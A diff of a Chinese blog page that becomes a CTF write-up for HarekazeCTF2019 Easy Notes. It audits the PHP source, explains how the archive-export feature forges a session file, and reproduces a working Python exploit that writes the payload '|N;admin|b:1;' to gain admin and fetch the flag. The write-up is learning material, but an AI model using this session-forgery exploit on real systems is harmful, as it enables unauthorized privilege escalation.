@@ -145,198 +145,214 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">HarekazeCTF2019_Easy_Notes</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-11-02 16:37:03
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/web-buuctf/">web-buuctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/session%E4%BC%AA%E9%80%A0/">session伪造</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>558 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>3 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>题目给了源码，emmm只不过感觉很多题都有github链接，但是题目并没说什么题目有源码，害我每次都在那儿像个啥子一样找半天。</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line">&lt;section&gt;</span><br><span class="line">  &lt;h2&gt;Get flag&lt;/h2&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    if (is_admin()) &#123;</span><br><span class="line">      echo &quot;Congratulations! The flag is: &lt;code&gt;&quot; . getenv(&#x27;FLAG&#x27;) . &quot;&lt;/code&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;You are not an admin :(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/section&gt;</span><br><span class="line">lib.php</span><br><span class="line">function is_admin() &#123;</span><br><span class="line">  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return $_SESSION[&#x27;admin&#x27;] === true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>需要session为admin===true</p>
+<p>lib.php里们没找到什么可以修改session文件的函数，但是在export.php里面存在操作文件的东西</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;init.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_logged_in()) &#123;</span><br><span class="line">  redirect(<span class="string">&#x27;/?page=home&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$notes</span> = get_notes();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$type</span> = <span class="string">&#x27;zip&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$type</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = get_user() . <span class="string">&#x27;-&#x27;</span> . bin2hex(random_bytes(<span class="number">8</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$type</span>;</span><br><span class="line"><span class="variable">$filename</span> = str_replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$filename</span>); <span class="comment">// avoid path traversal</span></span><br><span class="line"><span class="variable">$path</span> = TEMP_DIR . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$type</span> === <span class="string">&#x27;tar&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$archive</span> = <span class="keyword">new</span> PharData(<span class="variable">$path</span>);</span><br><span class="line">  <span class="variable">$archive</span>-&gt;startBuffering();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// use zip as default</span></span><br><span class="line">  <span class="variable">$archive</span> = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">  <span class="variable">$archive</span>-&gt;open(<span class="variable">$path</span>, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$index</span> = <span class="number">0</span>; <span class="variable">$index</span> &lt; count(<span class="variable">$notes</span>); <span class="variable">$index</span>++) &#123;</span><br><span class="line">  <span class="variable">$note</span> = <span class="variable">$notes</span>[<span class="variable">$index</span>];</span><br><span class="line">  <span class="variable">$title</span> = <span class="variable">$note</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">  <span class="variable">$title</span> = preg_replace(<span class="string">&#x27;/[^!-~]/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="variable">$title</span>);</span><br><span class="line">  <span class="variable">$title</span> = preg_replace(<span class="string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="variable">$title</span>); <span class="comment">// delete suspicious characters</span></span><br><span class="line">  <span class="variable">$archive</span>-&gt;addFromString(<span class="string">&quot;<span class="subst">&#123;$index&#125;</span>_<span class="subst">&#123;$title&#125;</span>.json&quot;</span>, json_encode(<span class="variable">$note</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$type</span> === <span class="string">&#x27;tar&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$archive</span>-&gt;stopBuffering();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$archive</span>-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="variable">$filename</span> . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Length: &#x27;</span> . filesize(<span class="variable">$path</span>));</span><br><span class="line">header(<span class="string">&#x27;Content-Type: application/zip&#x27;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
-
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
-
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
-
-    }
-
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>以sess_ 登录，那么在export的filename当中，get_user()就会返回sess再将<code>type=.</code>因为下面的字符串替换就会把后面’.’给弄没了。</p>
+<p>网上的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&#x27;http://2c84bf34-ac3c-4a8e-8f77-7868da243209.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># login as sess_</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    sess.post(URL + <span class="string">&#x27;login.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;sess_&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a crafted note</span></span><br><span class="line">    sess.post(URL + <span class="string">&#x27;add.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;|N;admin|b:1;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a fake session</span></span><br><span class="line">    r = sess.get(URL + <span class="string">&#x27;export.php?type=.&#x27;</span>).headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">    sessid = re.findall(<span class="string">r&#x27;sess_([0-9a-z-]+)&#x27;</span>, r)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(sessid)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    r = requests.get(URL + <span class="string">&#x27;?page=flag&#x27;</span>, cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">    &#125;).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag = re.findall(<span class="string">r&#x27;flag\&#123;.+\&#125;&#x27;</span>, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
 
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/11/03/supermarket/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">supermarket</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/10/30/%E5%85%B3%E4%BA%8E-htaccess%E7%9A%84%E6%8A%80%E5%B7%A7%E8%AE%B0%E5%BD%95/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">关于.htaccess的技巧记录</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
 
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
+        
+    
+</div>
 
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+            </div>
+        
+    </div>
+</div>
 
 
                 
